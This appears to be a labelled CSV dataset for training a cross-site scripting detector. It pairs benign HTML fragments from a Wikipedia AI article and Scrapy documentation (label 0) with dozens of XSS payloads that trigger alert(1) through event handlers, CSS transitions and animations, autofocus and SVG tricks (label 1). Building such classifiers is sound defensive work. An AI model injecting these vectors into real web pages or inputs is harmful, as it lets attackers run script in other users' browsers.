Sentence,Label
"<p>The relationship between automation and employment is complicated. While automation eliminates old jobs, it also creates new jobs through micro-economic and macro-economic effects.<sup id=""cite_ref-384"" class=""reference""><a href=""#cite_note-384"">&#91;373&#93; </a> </sup> Unlike previous waves of automation, many middle-class jobs may be eliminated by artificial intelligence; <i><a href=""/wiki/The_Economist"" title=""The Economist"">The Economist </a> </i> states that ""the worry that AI could do to white-collar jobs what steam power did to blue-collar ones during the Industrial Revolution"" is ""worth taking seriously"".<sup id=""cite_ref-385"" class=""reference""><a href=""#cite_note-385"">&#91;374&#93; </a> </sup> Subjective estimates of the risk vary widely; for example, Michael Osborne and <a href=""/wiki/Carl_Benedikt_Frey"" title=""Carl Benedikt Frey"">Carl Benedikt Frey </a> estimate 47% of U.S. jobs are at ""high risk"" of potential automation, while an OECD report classifies only 9% of U.S. jobs as ""high risk"".<sup id=""cite_ref-386"" class=""reference""><a href=""#cite_note-386"">&#91;375&#93; </a> </sup><sup id=""cite_ref-387"" class=""reference""><a href=""#cite_note-387"">&#91;376&#93; </a> </sup><sup id=""cite_ref-388"" class=""reference""><a href=""#cite_note-388"">&#91;377&#93; </a> </sup> Jobs at extreme risk range from paralegals to fast food cooks, while job demand is likely to increase for care-related professions ranging from personal healthcare to the clergy.<sup id=""cite_ref-389"" class=""reference""><a href=""#cite_note-389"">&#91;378&#93; </a> </sup> Author <a href=""/wiki/Martin_Ford_(author)"" title=""Martin Ford (author)"">Martin Ford </a> and others go further and argue that many jobs are routine, repetitive and (to an AI) predictable; Ford warns that these jobs may be automated in the next couple of decades, and that many of the new jobs may not be ""accessible to people with average capability"", even with retraining. Economists point out that in the past technology has tended to increase rather than reduce total employment, but acknowledge that ""we're in uncharted territory"" with AI.<sup id=""cite_ref-guardian_jobs_debate_24-1"" class=""reference""><a href=""#cite_note-guardian_jobs_debate-24"">&#91;24&#93; </a> </sup>",0
"SRC=""javascript:alert('')",1
"<li id=""cite_note-Default_reasoning_and_non-monotonic_logic-105""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-1""><sup><i><b>b </b> </i> </sup> </a> ",0
"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",1
"<li id=""cite_note-FOOTNOTEDomingos2015chapter_6-212""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"">^ </a> </b> ",0
<title id=x tabindex=1 onfocus=alert(1)></title>,1
"<dt><a class=""reference internal"" href=""topics/commands.html""><span class=""doc"">Command line tool",0
<noframes onpointerout=alert(1)>XSS</noframes>,1
"<li id=""cite_note-FOOTNOTEMarkoff2011-45""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEMarkoff2011_45-0"">^ </a> </b> ",0
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",1
"<li><a href=""/wiki/Semiotics"" title=""Semiotics"">Semiotics </a> </li>",0
"<font onmousedown=""alert(1)"">test</font>",1
"Pamela <a href=""#CITEREFMcCorduck2004"">McCorduck (2004 </a>, pp.&#160;424) writes of ""the rough shattering of AI in subfields—vision, natural language, decision theory, genetic algorithms, robotics&#160;... and these with own sub-subfield—that would hardly have anything to say to each other."" ",0
"<style>:target {transform: rotate(180deg);}</style><table id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></table>",1
"<li><a href=""/wiki/Adam_Tooze"" title=""Adam Tooze"">Tooze, Adam </a>, ""Democracy and Its Discontents"", <i><a href=""/wiki/The_New_York_Review_of_Books"" title=""The New York Review of Books"">The New York Review of Books </a> </i>, vol. LXVI, no. 10 (6 June 2019), pp.&#160;52–53, 56–57.  ""Democracy has no clear answer for the mindless operation of <a href=""/wiki/Bureaucracy"" title=""Bureaucracy"">bureaucratic </a> and <a href=""/wiki/Technology"" title=""Technology"">technological power </a>.  We may indeed be witnessing its extension in the form of artificial intelligence and <a href=""/wiki/Robotics"" title=""Robotics"">robotics </a>.  Likewise, after decades of dire warning, the <a href=""/wiki/Environmentalism"" title=""Environmentalism"">environmental problem </a> remains fundamentally unaddressed.... Bureaucratic overreach and environmental catastrophe are precisely the kinds of slow-moving existential challenges that democracies deal with very badly.... Finally, there is the threat du jour:  <a href=""/wiki/Corporation"" title=""Corporation"">corporations </a> and the technologies they promote.""  (pp.&#160;56–57.) </li> </ul>",0
"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></source>",1
"<li><a href=""#CITEREFDyson1998"">Dyson 1998 </a> </li> </ul>",0
<cite onpointermove=alert(1)>XSS</cite>,1
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">In fiction </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",1
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.moma.org/calendar/exhibitions/3863"">""Thinking Machines: Art and Design in the Computer Age, 1959–1989"" </a>. <i>The Museum of Modern Art </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 July ",0
<tfoot onpointerover=alert(1)>XSS</tfoot>,1
"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;235–248 </li> </ul>",0
"<strike oncut=""alert(1)"" contenteditable>test</strike>",1
"	 </span> <span class=""reference-text""><cite class=""citation web"">Pham, Sherisse (24 April 2017). <a rel=""nofollow"" class=""external text"" href=""https://money.cnn.com/2017/04/24/technology/alibaba-jack-ma-30-years-pain-robot-ceo/index.html"">""Jack Ma: In 30 years, the best CEO could be a robot"" </a>. <i>CNNMoney </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=CNNMoney&amp;rft.atitle=Jack+Ma%3A+In+30+years%2C+the+best+CEO+could+be+a+robot&amp;rft.date=2017-04-24&amp;rft.aulast=Pham&amp;rft.aufirst=Sherisse&amp;rft_id=https%3A%2F%2Fmoney.cnn.com%2F2017%2F04%2F24%2Ftechnology%2Falibaba-jack-ma-30-years-pain-robot-ceo%2Findex.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",1
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Early modern </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,1
"<li><a href=""/wiki/Robotics_suite"" title=""Robotics suite"">Suite </a> </li>",0
"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",1
"	 </span> <span class=""reference-text""><cite class=""citation web"">Christy, Charles A. (17 January 1990). <a rel=""nofollow"" class=""external text"" href=""https://www.latimes.com/archives/la-xpm-1990-01-17-fi-233-story.html"">""Impact of Artificial Intelligence on Banking"" </a>. <i>latimes.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">10 September ",0
<meta id=x tabindex=1 onactivate=alert(1)></meta>,1
"           <a href=""#"" class=""icon icon-home""> Scrapy",0
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",1
"<dt><a class=""reference internal"" href=""topics/signals.html""><span class=""doc"">Signals",0
"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",1
"	 </span> <span class=""reference-text"">Wallach, pp 55–73. ",0
"<html onpaste=""alert(1)"" contenteditable>test</html>",1
"<ul><li><a href=""/wiki/Zairja"" title=""Zairja"">Zairja </a> </li>",0
<dl onpointerout=alert(1)>XSS</dl>,1
"<li><a href=""/wiki/Daniel_Dennett"" title=""Daniel Dennett"">Daniel Dennett </a> </li> </ul>",0
"<ins ondblclick=""alert(1)"">test</ins>",1
"<li id=""cite_note-AI_as_evolution-412""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_as_evolution_412-0"">^ </a> </b> ",0
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,1
"<li><a href=""/wiki/Glossary_of_electrical_and_electronics_engineering"" title=""Glossary of electrical and electronics engineering"">Electrical and electronics engineering </a> </li>",0
"<code onmousedown=""alert(1)"">test</code>",1
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;~363–379, </li>",0
"<image onpaste=""alert(1)"" contenteditable>test</image>",1
    <h2>Navigation menu </h2>,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></output>",1
"<li><cite id=""CITEREFvan_der_WaltBernard2006"" class=""citation web"">van der Walt, Christiaan; Bernard, Etienne (2006). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20090325194051/http://www.patternrecognition.co.za/publications/cvdwalt_data_characteristics_classifiers.pdf"">""Data characteristics that determine classifier performance"" </a> <span class=""cs1-format"">(PDF) ",0
<svg><set onend=alert(1) attributename=x dur=1s>,1
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio; Lebiere, Christian; Oltramari, Alessandro (May 2018). ""The knowledge level in cognitive architectures: Current limitations and possibile developments"". <i>Cognitive Systems Research </i>. <b>48 </b>: 39–55. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.05.001"">10.1016/j.cogsys.2017.05.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665207"">2318/1665207 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+knowledge+level+in+cognitive+architectures%3A+Current+limitations+and+possibile+developments&amp;rft.volume=48&amp;rft.pages=39-55&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665207&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.05.001&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rft.au=Lebiere%2C+Christian&amp;rft.au=Oltramari%2C+Alessandro&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
<hgroup onpointerover=alert(1)>XSS</hgroup>,1
"<a href=""/wiki/Gaussian_mixture_model"" class=""mw-redirect"" title=""Gaussian mixture model"">Gaussian mixture model </a>:",0
<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>,1
"<li id=""cite_note-Classical_planning-112""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Classical_planning_112-0"">^ </a> </b> ",0
"<datalist onmouseup=""alert(1)"">test</datalist>",1
"<li><a href=""/wiki/Centre_for_the_Study_of_Existential_Risk"" title=""Centre for the Study of Existential Risk"">Centre for the Study of Existential Risk </a> </li>",0
"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",1
" </p><p>One main factor that influences the ability for a driver-less automobile to function is mapping. In general, the vehicle would be pre-programmed with a map of the area being driven. This map would include data on the approximations of street light and curb heights in order for the vehicle to be aware of its surroundings. However, Google has been working on an algorithm with the purpose of eliminating the need for pre-programmed maps and instead, creating a device that would be able to adjust to a variety of new surroundings.<sup id=""cite_ref-311"" class=""reference""><a href=""#cite_note-311"">&#91;300&#93; </a> </sup> Some self-driving cars are not equipped with steering wheels or brake pedals, so there has also been research focused on creating an algorithm that is capable of maintaining a safe environment for the passengers in the vehicle through awareness of speed and driving conditions.<sup id=""cite_ref-312"" class=""reference""><a href=""#cite_note-312"">&#91;301&#93; </a> </sup>",0
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationend=""alert(1)""></tbody>",1
"    <script type=""text/javascript"" src=""_static/js/theme.js""></script>",0
"<span draggable=""true"" ondrag=""alert(1)"">test</span>",1
"<li>Joe (""<a href=""/wiki/A_Logic_Named_Joe"" title=""A Logic Named Joe"">A Logic Named Joe </a>"", 1946) </li>",0
"<br draggable=""true"" ondragenter=""alert(1)"">test</br>",1
"<li><a href=""/wiki/Robot_software"" title=""Robot software"">Software </a> </li>",0
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",1
"		<a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Special:Log&amp;type=review&amp;page=Artificial_intelligence"">reviewed </a> on <i>16 March 2020 </i>. </div>",0
"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figure>",1
"<li id=""cite_note-Reinforcement_learning-119""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Reinforcement_learning_119-0"">^ </a> </b> ",0
"<textarea onkeydown=""alert(1)"" contenteditable>test</textarea>",1
"<ul><li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Category </a> </b> </li>",0
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationstart=""alert(1)""></noscript>",1
"	 <div style=""padding:0em 0.25em"">",0
"<dl oncut=""alert(1)"" contenteditable>test</dl>",1
"	 </span> <span class=""reference-text""><cite class=""citation web"">Administrator. <a rel=""nofollow"" class=""external text"" href=""http://www.i-programmer.info/news/105-artificial-intelligence/2176-kinects-ai-breakthrough-explained.html"">""Kinect's AI breakthrough explained"" </a>. <i>i-programmer.info </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160201031242/http://www.i-programmer.info/news/105-artificial-intelligence/2176-kinects-ai-breakthrough-explained.html"">Archived </a> from the original on 1 February 2016. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=i-programmer.info&amp;rft.atitle=Kinect%27s+AI+breakthrough+explained&amp;rft.au=Administrator&amp;rft_id=http%3A%2F%2Fwww.i-programmer.info%2Fnews%2F105-artificial-intelligence%2F2176-kinects-ai-breakthrough-explained.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
"<map oncopy=""alert(1)"" contenteditable>test</map>",1
"	 <div id=""mw-hidden-catlinks"" class=""mw-hidden-catlinks mw-hidden-cats-hidden"">Hidden categories: <ul><li><a href=""/wiki/Category:Wikipedia_articles_needing_page_number_citations_from_December_2016"" title=""Category:Wikipedia articles needing page number citations from December 2016"">Wikipedia articles needing page number citations from December 2016 </a> </li><li><a href=""/wiki/Category:CS1_Chinese-language_sources_(zh)"" title=""Category:CS1 Chinese-language sources (zh)"">CS1 Chinese-language sources (zh) </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_needing_page_number_citations_from_February_2011"" title=""Category:Wikipedia articles needing page number citations from February 2011"">Wikipedia articles needing page number citations from February 2011 </a> </li><li><a href=""/wiki/Category:Webarchive_template_wayback_links"" title=""Category:Webarchive template wayback links"">Webarchive template wayback links </a> </li><li><a href=""/wiki/Category:All_articles_with_dead_external_links"" title=""Category:All articles with dead external links"">All articles with dead external links </a> </li><li><a href=""/wiki/Category:Articles_with_dead_external_links_from_October_2019"" title=""Category:Articles with dead external links from October 2019"">Articles with dead external links from October 2019 </a> </li><li><a href=""/wiki/Category:Articles_with_permanently_dead_external_links"" title=""Category:Articles with permanently dead external links"">Articles with permanently dead external links </a> </li><li><a href=""/wiki/Category:Pages_with_citations_lacking_titles"" title=""Category:Pages with citations lacking titles"">Pages with citations lacking titles </a> </li><li><a href=""/wiki/Category:Pages_with_citations_having_bare_URLs"" title=""Category:Pages with citations having bare URLs"">Pages with citations having bare URLs </a> </li><li><a href=""/wiki/Category:Pages_with_URL_errors"" title=""Category:Pages with URL errors"">Pages with URL errors </a> </li><li><a href=""/wiki/Category:Wikipedia_pending_changes_protected_pages"" title=""Category:Wikipedia pending changes protected pages"">Wikipedia pending changes protected pages </a> </li><li><a href=""/wiki/Category:Articles_with_short_description"" title=""Category:Articles with short description"">Articles with short description </a> </li><li><a href=""/wiki/Category:Use_dmy_dates_from_January_2018"" title=""Category:Use dmy dates from January 2018"">Use dmy dates from January 2018 </a> </li><li><a href=""/wiki/Category:All_articles_with_unsourced_statements"" title=""Category:All articles with unsourced statements"">All articles with unsourced statements </a> </li><li><a href=""/wiki/Category:Articles_with_unsourced_statements_from_June_2019"" title=""Category:Articles with unsourced statements from June 2019"">Articles with unsourced statements from June 2019 </a> </li><li><a href=""/wiki/Category:Articles_with_unsourced_statements_from_July_2019"" title=""Category:Articles with unsourced statements from July 2019"">Articles with unsourced statements from July 2019 </a> </li><li><a href=""/wiki/Category:All_accuracy_disputes"" title=""Category:All accuracy disputes"">All accuracy disputes </a> </li><li><a href=""/wiki/Category:Articles_with_disputed_statements_from_July_2019"" title=""Category:Articles with disputed statements from July 2019"">Articles with disputed statements from July 2019 </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_needing_clarification_from_July_2019"" title=""Category:Wikipedia articles needing clarification from July 2019"">Wikipedia articles needing clarification from July 2019 </a> </li><li><a href=""/wiki/Category:Articles_containing_potentially_dated_statements_from_2016"" title=""Category:Articles containing potentially dated statements from 2016"">Articles containing potentially dated statements from 2016 </a> </li><li><a href=""/wiki/Category:All_articles_containing_potentially_dated_statements"" title=""Category:All articles containing potentially dated statements"">All articles containing potentially dated statements </a> </li><li><a href=""/wiki/Category:Articles_needing_additional_references_from_January_2020"" title=""Category:Articles needing additional references from January 2020"">Articles needing additional references from January 2020 </a> </li><li><a href=""/wiki/Category:All_articles_needing_additional_references"" title=""Category:All articles needing additional references"">All articles needing additional references </a> </li><li><a href=""/wiki/Category:Articles_with_unsourced_statements_from_December_2019"" title=""Category:Articles with unsourced statements from December 2019"">Articles with unsourced statements from December 2019 </a> </li><li><a href=""/wiki/Category:CS1:_Julian%E2%80%93Gregorian_uncertainty"" title=""Category:CS1: Julian–Gregorian uncertainty"">CS1: Julian–Gregorian uncertainty </a> </li><li><a href=""/wiki/Category:CS1:_long_volume_value"" title=""Category:CS1: long volume value"">CS1: long volume value </a> </li><li><a href=""/wiki/Category:Articles_with_Internet_Encyclopedia_of_Philosophy_links"" title=""Category:Articles with Internet Encyclopedia of Philosophy links"">Articles with Internet Encyclopedia of Philosophy links </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_BNF_identifiers"" title=""Category:Wikipedia articles with BNF identifiers"">Wikipedia articles with BNF identifiers </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_GND_identifiers"" title=""Category:Wikipedia articles with GND identifiers"">Wikipedia articles with GND identifiers </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_LCCN_identifiers"" title=""Category:Wikipedia articles with LCCN identifiers"">Wikipedia articles with LCCN identifiers </a> </li><li><a href=""/wiki/Category:Wikipedia_articles_with_NDL_identifiers"" title=""Category:Wikipedia articles with NDL identifiers"">Wikipedia articles with NDL identifiers </a> </li> </ul> </div> </div>",0
